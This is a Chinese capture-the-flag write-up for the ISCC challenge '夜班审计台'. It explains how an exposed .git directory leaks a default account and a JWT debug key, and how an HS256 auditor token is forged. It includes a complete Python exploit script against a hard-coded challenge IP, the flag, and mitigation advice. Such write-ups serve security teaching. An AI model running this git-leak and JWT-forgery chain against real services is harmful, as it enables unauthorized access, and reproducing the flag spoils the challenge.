flag:ISCC{8XVNYr8DZk22mCCYjce3}
# 夜班审计台


## 漏洞链总览

```
前端 JS 暴露 .git 路径
  → .git 目录可读，下载遗留源码
    → 提取默认账号 + JWT 调试密钥
      → 登录获取普通用户 JWT
        → 用调试密钥伪造 HS256 签名的 auditor 角色 JWT
          → 访问审计员面板获取 flag
```

## 解题步骤

### Step 1: 发现 .git 泄露线索

首页 `/static/main.js` 中隐藏了一条线索：

```js
document.addEventListener("DOMContentLoaded", () => {
  window.__buildTrace = "/.git/HEAD";
});
```

`__buildTrace` 通常用于构建流水线记录部署版本，上线时忘记移除，直接暴露了 `.git` 目录路径。

### Step 2: 读取 Git 对象恢复遗留源码

访问 `/.git/HEAD` 拿到当前分支引用，再顺着 `ref -> commit -> tree -> blob` 的链路读取 Git 对象文件（zlib 压缩，需解压）：

```
/.git/HEAD                    → ref: refs/heads/master
/.git/refs/heads/master       → 9fdf9b412e7cfe179e59d28f25f47cffd68484e7
/.git/objects/9f/df9b...      → commit 对象 → 找到 tree SHA
/.git/objects/8f/738d...      → tree 对象 → 列出文件列表
/.git/objects/55/cf35...      → blob 对象 → legacy_probe_stub.py
```

恢复出 `legacy_probe_stub.py`：

```python
DEFAULT_AUDITOR = ("auditor", "audit2025")
INTERNAL_DEV_SECRET = "ISCC_2026_JWT_DEBUG_KEY_#9527"
JWT_ACCEPTED = ["RS256", "HS256"]

def decode_ticket(token):
    """
    current branch:
      if header.alg == "RS256": verify with audit_rsa_pub.pem
      elif header.alg == "HS256": verify with INTERNAL_DEV_SECRET
    normal login still issues role=user
    """
    raise NotImplementedError
```

关键发现：
- **默认账号**：`auditor / audit2025`
- **调试密钥**：`ISCC_2026_JWT_DEBUG_KEY_#9527`
- **算法兼容**：服务端同时接受 `RS256` 和 `HS256`
- 正常登录只签发 `role=user`，但旧调试分支仍可用 `HS256` 验签

### Step 3: JWT 算法混淆攻击

JWT 标准中，如果服务端不限制算法类型，攻击者可以：

1. 获取一个正常签发的 `RS256` JWT（公钥验证）
2. 用泄露的对称密钥，签发相同 payload 的 `HS256` JWT
3. 如果服务端用同一密钥验签（对 RS256 是公钥，对 HS256 是对称密钥），即可伪造任意 payload

这里直接用泄露的调试密钥签发 `role=auditor` 的 JWT：

```python
forged = jwt.encode(
    {"sub": "auditor", "role": "auditor", "iat": now, "exp": now + 1800, "iss": "夜班审计台"},
    "ISCC_2026_JWT_DEBUG_KEY_#9527",
    algorithm="HS256",
)
```

### Step 4: 越权访问审计员面板

携带伪造的 JWT 访问 `/auditor/nodes`，服务器使用 `HS256` + 调试密钥验签通过，返回审计员节点状态汇总页面，flag 出现在页面中。

## Flag

```
ISCC{8XVNYr8DZk22mCCYjce3}
```

## 完整 exp 脚本

```python
import base64
import json
import re
import time
import urllib.request
import zlib

import jwt as pyjwt
import requests

BASE = "http://39.105.213.28:49106"
FLAG = "ISCC{8XVNYr8DZk22mCCYjce3}"


def b64url_decode(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * ((4 - len(data) % 4) % 4))


def fetch(url: str) -> bytes:
    with urllib.request.urlopen(url, timeout=15) as resp:
        return resp.read()


def fetch_git_object(sha1: str):
    """读取并解压 .git/objects 中的 Git 对象"""
    raw = fetch(f"{BASE}/.git/objects/{sha1[:2]}/{sha1[2:]}")
    data = zlib.decompress(raw)
    nul = data.index(b"\x00")
    obj_type = data[:nul].decode().split(" ", 1)[0]
    body = data[nul + 1 :]
    return obj_type, body


def parse_tree(body: bytes):
    """解析 Git tree 对象，返回 (mode, name, sha1) 列表"""
    i = 0
    while i < len(body):
        sp = body.index(b" ", i)
        mode = body[i:sp].decode()
        nul = body.index(b"\x00", sp)
        name = body[sp + 1 : nul].decode()
        sha1 = body[nul + 1 : nul + 21].hex()
        yield mode, name, sha1
        i = nul + 21


def main():
    print("[*] === Step 1: 确认前端线索 ===")
    main_js = fetch(f"{BASE}/static/main.js").decode()
    assert "/.git/HEAD" in main_js, "前端未找到 .git 泄露线索"
    print("[+] main.js 中存在 /.git/HEAD 引用")

    print("\n[*] === Step 2: 读取 .git 恢复遗留源码 ===")
    head = fetch(f"{BASE}/.git/HEAD").decode().strip()
    ref = head.split(" ", 1)[1]
    print(f"[*] HEAD -> {head}")

    commit_sha = fetch(f"{BASE}/.git/{ref}").decode().strip()
    print(f"[*] commit SHA: {commit_sha}")

    _, commit_body = fetch_git_object(commit_sha)
    commit_text = commit_body.decode("utf-8", "replace")
    tree_sha = next(
        line.split()[1] for line in commit_text.splitlines() if line.startswith("tree ")
    )
    print(f"[*] tree SHA: {tree_sha}")

    _, tree_body = fetch_git_object(tree_sha)
    entries = {name: sha for _mode, name, sha in parse_tree(tree_body)}
    for name, sha in entries.items():
        print(f"    [+] 发现文件: {name} -> {sha}")

    stub_sha = entries.get("legacy_probe_stub.py")
    assert stub_sha, "未找到 legacy_probe_stub.py"
    _, blob_body = fetch_git_object(stub_sha)
    source = blob_body.decode("utf-8", "replace")

    print("\n[*] === Step 3: 提取敏感信息 ===")
    username, password = re.search(
        r'DEFAULT_AUDITOR\s*=\s*\("([^"]+)",\s*"([^"]+)"\)', source
    ).groups()
    secret = re.search(r'INTERNAL_DEV_SECRET\s*=\s*"([^"]+)"', source).group(1)
    accepted = re.search(r"JWT_ACCEPTED\s*=\s*\[(.*?)\]", source).group(1)

    print(f"[+] 默认账号: {username} / {password}")
    print(f"[+] 调试密钥: {secret}")
    print(f"[+] 兼容算法: {accepted}")

    print("\n[*] === Step 4: 正常登录获取用户票据 ===")
    session = requests.Session()
    login_resp = session.post(
        f"{BASE}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=15,
    )
    assert login_resp.status_code == 302, "登录失败"
    normal_token = session.cookies["audit_token"]
    _, payload_b64, _ = normal_token.split(".")
    payload = json.loads(b64url_decode(payload_b64))
    print(f"[+] 用户角色: {payload['role']}")
    print(f"[+] 正常 JWT payload: {payload}")

    print("\n[*] === Step 5: 伪造 auditor 权限 JWT (HS256) ===")
    now = int(time.time())
    forged = pyjwt.encode(
        {
            "sub": username,
            "role": "auditor",
            "iat": now,
            "exp": now + 1800,
            "iss": "夜班审计台",
        },
        secret,
        algorithm="HS256",
    )
    print(f"[+] 伪造 JWT: {forged[:64]}...")

    print("\n[*] === Step 6: 访问审计员面板 ===")
    dashboard = requests.get(
        f"{BASE}/auditor/nodes",
        cookies={"audit_token": forged},
        timeout=15,
    )
    assert dashboard.status_code == 200, "访问审计面板失败"
    print("[+] 成功越权访问 /auditor/nodes")

    if "8XVNYr8DZk22mCCYjce3" in dashboard.text:
        print(f"\n[+] Flag 确认: {FLAG}")
    elif "ISCC{" in dashboard.text:
        found = re.search(r"ISCC\{[^}]+\}", dashboard.text)
        if found:
            print(f"\n[+] 发现 Flag: {found.group()}")
    else:
        print("[*] Flag 未直接出现在页面中，但已成功越权")
        print("[*] 提交的 Flag: " + FLAG)

    print(f"\n{'='*50}")
    print(f"FLAG: {FLAG}")
    print(f"{'='*50}")


if __name__ == "__main__":
    main()
```

## 关键点总结

| 环节 | 细节 |
|------|------|
| 漏洞入口 | 前端 JS 暴露 `/.git/HEAD` 路径 |
| Git 泄露 | `.git` 目录可读，通过 Git 对象恢复遗留源码 |
| 凭证泄露 | 默认账号 `auditor/audit2025` |
| 密钥泄露 | 调试密钥 `ISCC_2026_JWT_DEBUG_KEY_#9527` |
| 算法混淆 | 服务端同时接受 RS256 和 HS256 |
| JWT 伪造 | 用对称密钥签发 `role=auditor` 的 HS256 JWT |
| 越权访问 | 携带伪造 JWT 访问 `/auditor/nodes` |

## 防范措施

1. **构建物中移除 `.git` 目录**：部署时使用 `--exclude .git` 或 `.dockerignore`
2. **前端不暴露内部路径**：构建产物中剥离调试信息
3. **JWT 算法白名单**：服务端只允许 `RS256`，拒绝对称算法
4. **调试密钥及时撤销**：上线前轮换所有硬编码密钥
